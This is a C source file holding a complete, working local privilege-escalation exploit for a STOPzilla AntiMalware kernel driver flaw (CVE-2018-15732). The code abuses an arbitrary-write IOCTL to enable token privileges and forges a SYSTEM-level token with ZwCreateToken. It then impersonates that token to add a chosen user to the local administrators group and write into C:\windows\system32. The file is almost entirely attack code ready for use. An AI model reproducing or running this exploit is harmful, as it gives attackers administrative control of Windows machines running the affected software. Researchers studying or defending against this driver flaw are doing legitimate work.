/*

Exploit Title    - STOPzilla AntiMalware Arbitrary Write Privilege Escalation
Date             - 13th September 2018
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - https://www.stopzilla.com/
Tested Version   - 6.5.2.59
Driver Version   - 3.0.23.0 - szkg64.sys
Tested on OS     - 64bit Windows 7 and Windows 10 (1803)
CVE ID           - CVE-2018-15732
Vendor fix url   - No response from vendor
Fixed Version    - 0day
Fixed driver ver - 0day
Modified version by Decoder:

- does not rely on the SeAssignPrimaryprivilege but uses the current thread in order to add the current user to local admin group
- on Windows versions >= 1809 set the AuthenticatioID to  ANONYMOUS_LOGON_LUID, you can still user CreateFile and RegSetKey ....

*/


#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <sddl.h>
#include <Lm.h>
#include <assert.h>
#include <tchar.h>

#pragma comment(lib,"winsta.lib")
#pragma comment(lib,"advapi32.lib")

#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
extern BOOL DumpToken(HANDLE Token);
//int WinStationSwitchToServicesSession();
HRESULT GetSid(
	LPCWSTR wszAccName,
	PSID * ppSid
)
{

	// Validate the input parameters.  
	if (wszAccName == NULL || ppSid == NULL)
	{
		return ERROR_INVALID_PARAMETER;
	}

	// Create buffers that may be large enough.  
	// If a buffer is too small, the count parameter will be set to the size needed.  
	const DWORD INITIAL_SIZE = 32;
	DWORD cbSid = 0;
	DWORD dwSidBufferSize = INITIAL_SIZE;
	DWORD cchDomainName = 0;
	DWORD dwDomainBufferSize = INITIAL_SIZE;
	WCHAR * wszDomainName = NULL;
	SID_NAME_USE eSidType;
	DWORD dwErrorCode = 0;
	HRESULT hr = 1;

	// Create buffers for the SID and the domain name.  
	*ppSid = (PSID) new BYTE[dwSidBufferSize];
	if (*ppSid == NULL)
	{
		return -1;
	}
	memset(*ppSid, 0, dwSidBufferSize);
	wszDomainName = new WCHAR[dwDomainBufferSize];
	if (wszDomainName == NULL)
	{
		return -1;
	}
	memset(wszDomainName, 0, dwDomainBufferSize * sizeof(WCHAR));

	// Obtain the SID for the account name passed.  
	for (; ; )
	{

		// Set the count variables to the buffer sizes and retrieve the SID.  
		cbSid = dwSidBufferSize;
		cchDomainName = dwDomainBufferSize;
		if (LookupAccountNameW(
			NULL,            // Computer name. NULL for the local computer  
			wszAccName,
			*ppSid,          // Pointer to the SID buffer. Use NULL to get the size needed,  
			&cbSid,          // Size of the SID buffer needed.  
			wszDomainName,   // wszDomainName,  
			&cchDomainName,
			&eSidType
		))
		{
			if (IsValidSid(*ppSid) == FALSE)
			{
				wprintf(L"The SID for %s is invalid.\n", wszAccName);
				dwErrorCode = ERROR;
			}
			break;
		}
		dwErrorCode = GetLastError();

		// Check if one of the buffers was too small.  
		if (dwErrorCode == ERROR_INSUFFICIENT_BUFFER)
		{
			if (cbSid > dwSidBufferSize)
			{

				// Reallocate memory for the SID buffer.  
				wprintf(L"The SID buffer was too small. It will be reallocated.\n");
				FreeSid(*ppSid);
				*ppSid = (PSID) new BYTE[cbSid];
				if (*ppSid == NULL)
				{
					return -1;
				}
				memset(*ppSid, 0, cbSid);
				dwSidBufferSize = cbSid;
			}
			if (cchDomainName > dwDomainBufferSize)
			{

				// Reallocate memory for the domain name buffer.  
				wprintf(L"The domain name buffer was too small. It will be reallocated.\n");
				delete[] wszDomainName;
				wszDomainName = new WCHAR[cchDomainName];
				if (wszDomainName == NULL)
				{
					return -1;
				}
				memset(wszDomainName, 0, cchDomainName * sizeof(WCHAR));
				dwDomainBufferSize = cchDomainName;
			}
		}
		else
		{
			wprintf(L"LookupAccountNameW failed. GetLastError returned: %d\n", dwErrorCode);
			hr = HRESULT_FROM_WIN32(dwErrorCode);
			break;
		}
	}

	delete[] wszDomainName;
	return hr;
}
void
get_system_privileges(PTOKEN_PRIVILEGES privileges)
{

	LUID luid;
	privileges->PrivilegeCount = 4;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;
	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;
	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[2].Luid = luid;
	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[3].Luid = luid;


}


void GetUser()
{
	TCHAR  buffer[64];
	DWORD k = 64;
	GetUserName(buffer, &k);
	printf("[i] user=%S\n", buffer);
}
typedef unsigned __int64 QWORD;


typedef struct _SID_BUILTIN
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[2];
} SID_BUILTIN, *PSID_BUILTIN;


typedef struct _SID_INTEGRITY
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[1];
} SID_INTEGRITY, *PSID_INTEGRITY;


typedef NTSYSAPI NTSTATUS(NTAPI *_ZwCreateToken)(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
	);


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	ULONG       ProcessId;
	UCHAR       ObjectTypeNumber;
	UCHAR       Flags;
	USHORT      Handle;
	QWORD       Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;


typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


typedef NTSTATUS(WINAPI *_NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

PTOKEN_PRIVILEGES SetPrivileges()
{
	PTOKEN_PRIVILEGES   privileges;
	LUID                luid;
	int                 NumOfPrivileges = 4;
	int                 nBufferSize;


	nBufferSize = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES) * NumOfPrivileges;
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, nBufferSize);

	privileges->PrivilegeCount = NumOfPrivileges;

	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;

	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[2].Luid = luid;



	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[3].Luid = luid;

	return privileges;
}

LPVOID GetInfoFromToken(HANDLE hToken, TOKEN_INFORMATION_CLASS type)
{
	DWORD    dwLengthNeeded;
	LPVOID   lpData = NULL;


	if (!GetTokenInformation(hToken, type, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		printf("\n[-] Failed to initialize GetTokenInformation %d", GetLastError());
		return NULL;
	}

	lpData = (LPVOID)LocalAlloc(LPTR, dwLengthNeeded);
	GetTokenInformation(hToken, type, lpData, dwLengthNeeded, &dwLengthNeeded);

	return lpData;
}



QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID)
{
	_NtQuerySystemInformation   NtQuerySystemInformation;
	PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo;
	ULONG                       i;
	PSYSTEM_HANDLE              pHandle;
	QWORD                       TokenAddress = 0;
	DWORD                       nSize = 4096;
	DWORD                       nReturn;
	BOOL                        tProcess;
	HANDLE                      hToken;


	if ((tProcess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) == FALSE)
	{
		printf("\n[-] OpenProcessToken() failed (%d)\n", GetLastError());
		return -1;
	}

	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	if (!NtQuerySystemInformation)
	{
		printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
		return -1;
	}

	do
	{
		nSize += 4096;
		pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), 0, nSize);
	} while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH);

	printf("\n[i] Current process id %d and token handle value %u", MyProcessID, hToken);

	for (i = 0; i < pSysHandleInfo->NumberOfHandles; i++)
	{

		if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle == (int)hToken)
		{
			TokenAddress = pSysHandleInfo->Handles[i].Object;
		}
	}

	HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
	return TokenAddress;
}




HANDLE
CreateUserToken(HANDLE base_token, wchar_t *username)
{
	LUID luid;
	PLUID pluidAuth;
	NTSTATUS ntStatus;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	HANDLE elevated_token;
	PTOKEN_STATISTICS stats;
	PTOKEN_PRIVILEGES privileges;
	PTOKEN_OWNER owner;
	PTOKEN_PRIMARY_GROUP primary_group;
	PTOKEN_DEFAULT_DACL default_dacl;
	PTOKEN_GROUPS groups;
	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityDelegation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID_AND_ATTRIBUTES pSid;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = { {'C', 'r', 'e', 'd', 'P', 'r', 'o', 0}, {0, 0} };  //{ { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };

        LUID authid = SYSTEM_LUID;
	// Win 10/2019 >= 1809 set ANONYMOUS_LOGON_LUID
        //LUID authid = ANONYMOUS_LOGON_LUID;
	_ZwCreateToken ZwCreateToken;
	PSID mysid;
	SID_BUILTIN TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegritySIDHigh = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_HIGH_RID };
	SID_INTEGRITY IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
	SID_INTEGRITY IntegritySIDMedium = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}

	
	userToken.User.Attributes = 0;
	HRESULT hr = GetSid(username, &mysid);
	userToken.User.Sid = mysid;
	AllocateLocallyUniqueId(&luid);
	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
	sourceToken.SourceIdentifier.HighPart = luid.HighPart;
	stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
	get_system_privileges(privileges);
	PSID group1, group2;
	// TrustedInstaller SID
	BOOL t = ConvertStringSidToSidA("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &group2);
	// Local Admin SID
	t = ConvertStringSidToSidA("S-1-5-32-544", &group1);
	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);
	pSid = groups->Groups;

	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
	{
		// change IL
		//if (pSid->Attributes & SE_GROUP_INTEGRITY)
		//	memcpy(pSid->Sid, &IntegritySIDMedium, sizeof(IntegritySIDMedium));

		PISID piSid = (PISID)pSid->Sid;
		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS) {
			pSid->Sid = group1;
			pSid->Attributes = SE_GROUP_ENABLED;
		}


		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_WORLD_RID) {
			pSid->Sid = group2;
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else {
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	owner->Owner = mysid;
	DWORD Size = 0;
	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;
	printf("\n[i] AuthId= 0x%lx\n", authid.LowPart);
	ntStatus = ZwCreateToken(&elevated_token,
		TOKEN_ALL_ACCESS,
		&oa,
		TokenImpersonation,
		pluidAuth,
		pli,
		&userToken,
		groups,
		privileges,
		owner,
		primary_group,
		default_dacl,
		&sourceToken
	);


	if (ntStatus == STATUS_SUCCESS)
		return elevated_token;
	else
		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);

	if (stats) LocalFree(stats);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);
	return NULL;
}




int wmain(int argc, wchar_t *argv[])
{

	QWORD      TokenAddressTarget;
	QWORD      SepPrivilegesOffset = 0x40;
	QWORD      PresentByteOffset;
	QWORD      EnableByteOffset;
	QWORD      TokenAddress;
	HANDLE     hDevice;
	char       devhandle[MAX_PATH];
	DWORD      dwRetBytes = 0;
	HANDLE     hTokenCurrent;
	HANDLE     hTokenElevate;


	printf("-------------------------------------------------------------------------------\n");
	printf("         STOPzilla AntiMalware (szkg64.sys) Arbitrary Write EoP Exploit        \n");
	printf("                 Tested on 64bit Windows 7 / Windows 10 (1803)                 \n");
	printf("                          Modified version by decoder                          \n");
	printf("-------------------------------------------------------------------------------\n");

	TokenAddress = TokenAddressCurrentProcess(GetCurrentProcess(), GetCurrentProcessId());
	printf("\n[i] Address of current process token 0x%p", TokenAddress);

	TokenAddressTarget = TokenAddress + SepPrivilegesOffset;
	printf("\n[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten\n", TokenAddressTarget);

	PresentByteOffset = TokenAddressTarget + 0x0;
	printf("[i] Present bits at 0x%p will be overwritten\n", PresentByteOffset);

	EnableByteOffset = TokenAddressTarget + 0x8;
	printf("[i] Enabled bits at 0x%p will be overwritten", EnableByteOffset);

	sprintf_s(devhandle, "\\\\.\\%s", "msprocess");

	hDevice = CreateFileA(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("\n[-] Open %s device failed\n\n", devhandle);
		return -1;
	}
	else
	{
		printf("\n[+] Open %s device successful", devhandle);
	}

	printf("\n[~] Press any key to continue . . .\n");
	getchar();

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrent))
	{
		printf("[-] Failed OpenProcessToken() %d\n\n", GetLastError());
		return NULL;
	}
	printf("[+] OpenProcessToken() handle opened successfully");

	do
	{
		printf("\n[*] Overwriting _SEP_TOKEN_PRIVILEGES bits");
		DeviceIoControl(hDevice, 0x80002063, NULL, 0, (LPVOID)PresentByteOffset, 0, &dwRetBytes, NULL);
		DeviceIoControl(hDevice, 0x80002063, NULL, 0, (LPVOID)EnableByteOffset, 0, &dwRetBytes, NULL);
		hTokenElevate = CreateUserToken(hTokenCurrent, argv[1]);
		Sleep(500);
	} while (hTokenElevate == NULL);
	HANDLE duped_token;
	/*
	BOOL res = DuplicateTokenEx(hTokenElevate,

		TOKEN_ALL_ACCESS,
		NULL,
		SecurityImpersonation,
		TokenImpersonation,
		&duped_token);*/
	HANDLE hCurrentThread = GetCurrentThread();
	if (SetThreadToken(&hCurrentThread, hTokenElevate) == 0) {
		printf("[-] Impersonation failed: %d\n", GetLastError());
	}
	else {
		printf("[+] SetThreadToken with elevated token: Impersonation successful!\n");
		GetUser();
		LOCALGROUP_INFO_1         localgroup_info;
		LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
		localgroup_members.lgrmi3_domainandname = argv[1];
		int err = NetLocalGroupAddMembers(L".",
			L"administrators",
			3,
			(LPBYTE)&localgroup_members,
			1);
		printf("[i] Added user: %S to administrator groups result:%d\n", argv[1], err);
		DWORD dBytesWritten;
		HANDLE hFile = CreateFile(L"C:\\windows\\system32\\test.txt",                // name of the write
			GENERIC_WRITE,          // open for writing
			FILE_SHARE_WRITE,                      // do not share
			NULL,                   // default security
			CREATE_ALWAYS,             // create new file only
			FILE_ATTRIBUTE_NORMAL,  // normal file
			NULL);
		printf("[i] Write file c:\\windows\\system32\\test.txt last error:%d\n", GetLastError());


	}

	CloseHandle(hDevice);

	return 0;
}
